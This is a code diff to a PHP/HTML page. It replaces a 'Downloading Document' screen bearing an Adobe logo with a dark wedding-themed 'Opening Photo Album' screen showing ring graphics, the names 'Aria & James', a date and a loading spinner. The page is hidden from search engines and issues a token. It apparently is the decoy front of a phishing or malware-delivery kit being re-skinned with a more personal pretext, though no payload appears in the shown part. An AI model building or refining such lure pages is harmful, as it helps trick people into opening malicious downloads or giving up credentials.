@@ -12,31 +12,47 @@ $tk = issue_token();
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="robots" content="noindex, nofollow">
-  <title>Downloading Document</title>
+  <title>Opening Photo Album</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500&display=swap');
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
-    .container {
-      width: 100%; height: 100vh;
-      display: flex; flex-direction: column;
-      align-items: center; justify-content: center;
-      background: #fff; gap: 15px; padding-bottom: 20vh;
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      height: 100vh; width: 100vw; overflow: hidden;
+      background: #0e0e0e url('assets/screen.png') center/cover no-repeat;
+      font-family: "Segoe UI", Tahoma, sans-serif; color: #e8e2d6;
     }
-    .logo { width: 80px; height: 80px; object-fit: contain; }
-    .download-text { font-weight: bold; font-size: 16px; }
+    .veil {
+      position: absolute; inset: 0;
+      background: radial-gradient(ellipse at center, rgba(14,14,14,0.35) 0%, rgba(14,14,14,0.82) 100%);
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+    }
+    .rings { width: 64px; height: 64px; margin-bottom: 26px; }
+    .names {
+      font-family: Georgia, "Times New Roman", serif;
+      font-size: 34px; letter-spacing: 4px; color: #efe6d2;
+      text-shadow: 0 2px 12px rgba(0,0,0,0.6);
+    }
+    .date {
+      font-size: 13px; letter-spacing: 3px; color: #b7ad99; margin-top: 12px;
+      text-transform: uppercase;
+    }
+    .status { margin-top: 30px; font-size: 13px; color: #cdc4b1; letter-spacing: 1px; }
     .spinner {
-      width: 40px; height: 40px;
-      border: 5px solid red; border-top-color: transparent;
-      border-radius: 50%;
-      animation: spinner 0.7s linear infinite;
+      width: 30px; height: 30px; margin: 18px auto 0 auto;
+      border: 3px solid #6d675c; border-top-color: #d8c9a3;
+      border-radius: 50%; animation: spin 0.8s linear infinite;
     }
-    @keyframes spinner { to { transform: rotate(360deg); } }
+    @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img src="assets/adobe-logo.png" alt="Logo" class="logo">
-    <div class="download-text">Downloading Document</div>
+  <div class="veil">
+    <svg class="rings" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="38" cy="54" r="26" fill="none" stroke="#c9a86a" stroke-width="7"/>
+      <circle cx="62" cy="46" r="26" fill="none" stroke="#a8894e" stroke-width="7"/>
+    </svg>
+    <div class="names">Aria &amp; James</div>
+    <div class="date">October 20, 2020 &middot; Toronto</div>
+    <div class="status">Opening the album&hellip;</div>
     <div class="spinner"></div>
   </div>
 
